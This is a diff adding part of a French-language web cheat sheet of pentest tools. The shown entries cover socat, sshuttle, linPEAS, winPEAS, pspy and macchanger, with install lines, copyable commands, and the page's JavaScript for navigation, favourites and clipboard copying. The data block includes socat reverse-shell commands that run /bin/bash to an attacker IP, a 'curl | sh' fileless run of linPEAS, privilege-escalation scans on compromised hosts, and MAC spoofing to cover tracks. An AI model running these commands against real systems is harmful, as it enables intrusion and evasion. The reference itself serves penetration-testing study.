+   {d:"Reverse shell à l'écoute (attaquant)",c:"socat -d -d TCP-LISTEN:4444 STDOUT"},
+   {d:"Reverse shell chiffré (côté cible)",c:"socat OPENSSL:VOTRE_IP:4444,verify=0 EXEC:/bin/bash"},
+   {d:"Redirection de port",c:"socat TCP-LISTEN:8080,fork TCP:interne:80"},
+   {d:"Stabiliser un shell (TTY)",c:"socat file:`tty`,raw,echo=0 TCP:VOTRE_IP:4444"},
+   {d:"Transfert de fichier",c:"socat TCP-LISTEN:9999,fork OPEN:fichier.bin"}]},
+ {n:"sshuttle",c:"anon",std:1,inst:"sudo apt install sshuttle",r:"VPN du pauvre via SSH : route tout un sous-réseau à travers un simple accès SSH.",cmds:[
+   {d:"Router un sous-réseau via SSH",c:"sshuttle -r user@PIVOT 10.10.10.0/24"},
+   {d:"Router tout le trafic",c:"sshuttle -r user@PIVOT 0.0.0.0/0"},
+   {d:"Inclure le DNS",c:"sshuttle --dns -r user@PIVOT 10.10.10.0/24"},
+   {d:"Avec une clé privée",c:"sshuttle -r user@PIVOT 10.10.10.0/24 -e 'ssh -i cle.pem'"}]},
+ {n:"linpeas",c:"anon",std:0,inst:"curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh",r:"Scanne un Linux compromis à la recherche de tous les chemins d'élévation de privilèges.",cmds:[
+   {d:"Lancer le scan complet",c:"./linpeas.sh"},
+   {d:"Exécuter sans l'écrire sur disque",c:"curl -L https://.../linpeas.sh | sh"},
+   {d:"Sauvegarder le rapport",c:"./linpeas.sh -a > linpeas.txt"},
+   {d:"Seulement une catégorie (ex. logiciels)",c:"./linpeas.sh -o SysI,Devs"}]},
+ {n:"winpeas",c:"anon",std:0,inst:"curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o winPEAS.exe",r:"Le pendant Windows de linPEAS : déniche les failles de privilège sur une cible compromise.",cmds:[
+   {d:"Lancer l'exécutable",c:"winPEASx64.exe"},
+   {d:"Sortie sans couleur (log)",c:"winPEASx64.exe log"},
+   {d:"Vérifications rapides",c:"winPEASx64.exe quiet fast"},
+   {d:"Version .bat (sans binaire)",c:"winPEAS.bat"}]},
+ {n:"pspy",c:"anon",std:0,inst:"curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o pspy64",r:"Espionne les processus et tâches cron d'un Linux sans être root — parfait pour le privesc.",cmds:[
+   {d:"Surveiller les processus",c:"./pspy64"},
+   {d:"Avec couleurs et sans tronquer",c:"./pspy64 -pf -i 1000"},
+   {d:"Surveiller des dossiers précis",c:"./pspy64 -r /etc -r /home"},
+   {d:"Rendre exécutable puis lancer",c:"chmod +x pspy64 && ./pspy64"}]},
+ {n:"macchanger",c:"anon",std:1,inst:"sudo apt install macchanger",r:"Change l'adresse MAC d'une interface pour brouiller les pistes sur le réseau local.",cmds:[
+   {d:"MAC aléatoire",c:"sudo macchanger -r eth0"},
+   {d:"MAC précise",c:"sudo macchanger -m 00:11:22:33:44:55 eth0"},
+   {d:"Restaurer la MAC d'origine",c:"sudo macchanger -p eth0"},
+   {d:"Afficher la MAC courante",c:"macchanger -s eth0"}]}
+];
+
+/* ---------- favoris (localStorage, tolérant aux erreurs) ---------- */
+let FAV={};
+try{FAV=JSON.parse(localStorage.getItem('hl_fav')||'{}')||{};}catch(e){FAV={};}
+function saveFav(){try{localStorage.setItem('hl_fav',JSON.stringify(FAV));}catch(e){}}
+function isFav(n){return !!FAV[n];}
+function toggleFav(n){if(FAV[n])delete FAV[n];else FAV[n]=1;saveFav();updateFavN();}
+function favCount(){return Object.keys(FAV).length;}
+
+const out=document.getElementById('out'),navEl=document.getElementById('nav'),metricsEl=document.getElementById('metrics');
+const q=document.getElementById('q'),ov=document.getElementById('ov'),modal=document.getElementById('modal'),toast=document.getElementById('toast');
+const favbtn=document.getElementById('favbtn'),favn=document.getElementById('favn'),mcatsEl=document.getElementById('mcats');
+let active="all",favOnly=false;
+
+function totalCmds(){return T.reduce((s,t)=>s+t.cmds.length,0);}
+function count(cid){return cid==="all"?T.length:T.filter(t=>t.c===cid).length}
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
+function fmtCmd(c){const e=esc(c);const sp=e.indexOf(' ');if(sp<0)return `<span style="color:#00ff9c">${e}</span>`;return `<span style="color:#00ff9c">${e.slice(0,sp)}</span>${e.slice(sp)}`;}
+
+function buildNav(){
+  let h=`<div class="navitem ${active==='all'?'on':''}" data-c="all"><span class="ic">▣</span><span class="nm">Tout</span><span class="ct">${T.length}</span></div><div class="navsep"></div>`;
+  CATS.forEach(c=>{const n=count(c.id);if(!n)return;h+=`<div class="navitem ${active===c.id?'on':''}" data-c="${c.id}"><span class="ic">${c.ic}</span><span class="nm">${c.name}</span><span class="ct">${n}</span></div>`;});
+  navEl.innerHTML=h;
+  navEl.querySelectorAll('.navitem').forEach(it=>it.onclick=()=>{active=it.dataset.c;favOnly=false;favbtn.classList.remove('on');buildNav();buildMobileCats();render();window.scrollTo({top:0,behavior:'smooth'});});
+}
+function buildMobileCats(){
+  let h=`<div class="mchip ${active==='all'?'on':''}" data-c="all">▣ Tout<span class="ct">${T.length}</span></div>`;
+  CATS.forEach(c=>{const n=count(c.id);if(!n)return;h+=`<div class="mchip ${active===c.id?'on':''}" data-c="${c.id}">${c.ic} ${c.name}<span class="ct">${n}</span></div>`;});
+  mcatsEl.innerHTML=h;
+  mcatsEl.querySelectorAll('.mchip').forEach(ch=>ch.onclick=()=>{active=ch.dataset.c;favOnly=false;favbtn.classList.remove('on');buildNav();buildMobileCats();render();window.scrollTo({top:0,behavior:'smooth'});});
+}
+function buildMetrics(){
+  const std=T.filter(t=>t.std).length;
+  metricsEl.innerHTML=`
+   <div class="metric"><div class="v">${T.length}</div><div class="l">outils</div></div>
+   <div class="metric"><div class="v c2">${totalCmds()}</div><div class="l">commandes</div></div>
+   <div class="metric"><div class="v c4">${CATS.length}</div><div class="l">catégories</div></div>
+   <div class="metric"><div class="v c3">${T.length-std}</div><div class="l">à installer</div></div>`;
+}
+function updateFavN(){const n=favCount();favn.textContent=n?`(${n})`:'';if(favOnly)render();}
+
+function render(){
+  const term=q.value.trim().toLowerCase();
+  let shown=0,html="";
+  const store={};
+  CATS.forEach(cat=>{
+    if(active!=="all"&&active!==cat.id)return;
+    let items=T.map((t,i)=>({t,i})).filter(o=>o.t.c===cat.id);
+    if(favOnly)items=items.filter(o=>isFav(o.t.n));
+    if(term)items=items.filter(o=>(o.t.n+" "+o.t.r+" "+o.t.cmds.map(x=>x.c+" "+x.d).join(" ")).toLowerCase().includes(term));
+    if(!items.length)return;
+    shown+=items.length;
+    html+=`<section class="section" id="sec-${cat.id}"><div class="sechead"><span class="ic">${cat.ic}</span><h2>${cat.name}</h2><span class="cnt">${items.length} outils · ${items.reduce((s,o)=>s+o.t.cmds.length,0)} commandes</span></div><div class="grid">`;
+    items.forEach(o=>{
+      const t=o.t;store[o.i]=t;
+      const badge=t.std?`<span class="badge std">✓ défaut</span>`:`<span class="badge add">⬇ install</span>`;
+      html+=`<div class="card ${t.std?'':'add'}" data-i="${o.i}">
+        <div class="top"><span class="name">${esc(t.n)}</span><span class="star ${isFav(t.n)?'on':''}" data-fav="${esc(t.n)}">${isFav(t.n)?'★':'☆'}</span>${badge}</div>
+        <div class="role">${esc(t.r)}</div>
+        <div class="inst"><span class="lbl">▸</span><span class="v">${esc(t.inst)}</span></div>
+        <div class="cardfoot"><span class="more">⊞ ${t.cmds.length} commandes</span><a class="src" href="${urlOf(t)}" target="_blank" rel="noopener" onclick="event.stopPropagation()">↗ ${esc(host(urlOf(t)))}</a></div>
+      </div>`;
+    });
+    html+=`</div></section>`;
+  });
+  out.innerHTML=html||`<div class="empty">Aucun outil ne correspond${favOnly?' à tes favoris':''}${term?` à « ${esc(term)} »`:''}</div>`;
+  IDX=store;
+  out.querySelectorAll('.card').forEach(c=>c.onclick=e=>{if(e.target.classList.contains('star'))return;openModal(IDX[c.dataset.i]);});
+  out.querySelectorAll('.star').forEach(s=>s.onclick=e=>{e.stopPropagation();toggleFav(s.dataset.fav);s.classList.toggle('on');s.textContent=s.classList.contains('on')?'★':'☆';});
+}
+let IDX={};
+
+function openModal(t){
+  const badge=t.std?`<span class="badge std mbadge">✓ défaut</span>`:`<span class="badge add mbadge">⬇ à installer</span>`;
+  const cat=CATS.find(c=>c.id===t.c);
+  const rows=t.cmds.map(cm=>`<div class="cmdrow"><div class="d">${esc(cm.d)}</div><div class="cmdline" data-cp="${esc(cm.c)}">${fmtCmd(cm.c)}<span class="cp">copier</span></div></div>`).join("");
+  const allTxt=t.cmds.map(cm=>"# "+cm.d+"\n"+cm.c).join("\n\n");
+  modal.innerHTML=`
+    <div class="mhead">
+      <button class="mclose" onclick="closeModal()">✕</button>${badge}
+      <div class="mcat">${cat.ic} ${esc(cat.name)}</div>
+      <h3>${esc(t.n)} <span class="mstar ${isFav(t.n)?'on':''}" id="mstar">${isFav(t.n)?'★':'☆'}</span></h3>
+      <div class="mrole">${esc(t.r)}</div>
+      <a class="msrc" href="${urlOf(t)}" target="_blank" rel="noopener">↗ Dépôt / doc officielle — ${esc(host(urlOf(t)))}</a>
+    </div>
+    <div class="mbody">
+      <div class="minst" data-cp="${esc(t.inst)}"><span class="lbl">Installation</span><span class="v">${esc(t.inst)}</span><span class="cp" style="opacity:1;position:static">copier</span></div>
+      <div class="mlabrow"><span class="mlab">${t.cmds.length} commandes utiles</span><button class="copyall" id="copyall">⧉ Copier tout</button></div>
+      ${rows}
+      <div class="mlab" style="margin-top:22px">Référence complète — toutes les options</div>
+      <div class="cmdrow"><div class="d">Page de manuel intégrale</div><div class="cmdline" data-cp="man ${esc(binOf(t))}">${fmtCmd("man "+binOf(t))}<span class="cp">copier</span></div></div>
+      <div class="cmdrow"><div class="d">Aide intégrée : toutes les options</div><div class="cmdline" data-cp="${esc(binOf(t))} --help">${fmtCmd(binOf(t)+" --help")}<span class="cp">copier</span></div></div>
+    </div>`;
+  modal.querySelectorAll('[data-cp]').forEach(el=>el.onclick=()=>copy(el.dataset.cp));
+  modal.querySelector('#copyall').onclick=()=>copy(allTxt,'toutes les commandes copiées ✓');
+  const ms=modal.querySelector('#mstar');
+  ms.onclick=()=>{toggleFav(t.n);ms.classList.toggle('on');ms.textContent=ms.classList.contains('on')?'★':'☆';render();};
+  ov.classList.add('on');document.body.style.overflow='hidden';
+}
+function closeModal(){ov.classList.remove('on');document.body.style.overflow='';}
+ov.onclick=e=>{if(e.target===ov)closeModal();};
+
+let tt;
+function copy(txt,msg){
+  const done=()=>{toast.textContent=msg||'copié ✓';toast.classList.add('on');clearTimeout(tt);tt=setTimeout(()=>toast.classList.remove('on'),1300);};
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(done).catch(()=>fb(txt,done));}else fb(txt,done);
+}
+function fb(txt,done){try{const a=document.createElement('textarea');a.value=txt;a.style.position='fixed';a.style.opacity='0';document.body.appendChild(a);a.select();document.execCommand('copy');document.body.removeChild(a);done();}catch(e){}}
+
+favbtn.onclick=()=>{favOnly=!favOnly;favbtn.classList.toggle('on',favOnly);if(favOnly){active="all";buildNav();}buildMobileCats();render();};
+q.addEventListener('input',render);
+document.addEventListener('keydown',e=>{
+  if(e.key==='Escape'){closeModal();}
+  if(e.key==='/'&&document.activeElement!==q){e.preventDefault();q.focus();}
+});
+
+buildNav();buildMobileCats();buildMetrics();updateFavN();render();
+</script>
+</body>
+</html>
